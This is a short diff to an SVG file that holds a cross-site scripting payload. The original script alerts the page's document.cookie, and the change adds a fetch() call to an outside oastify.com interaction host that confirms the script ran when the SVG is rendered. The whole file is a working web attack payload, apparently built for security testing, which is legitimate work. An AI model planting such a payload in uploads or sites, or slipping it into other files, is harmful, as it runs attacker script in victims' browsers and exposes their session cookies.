@@ -1,3 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert(document.cookie)</script>
+  <script>
+    fetch('https://kx1ohr9x43nk8nlesagmb48ip9v6jw71.oastify.com/svg-executed')
+    alert(document.cookie)
+  </script>
 </svg>
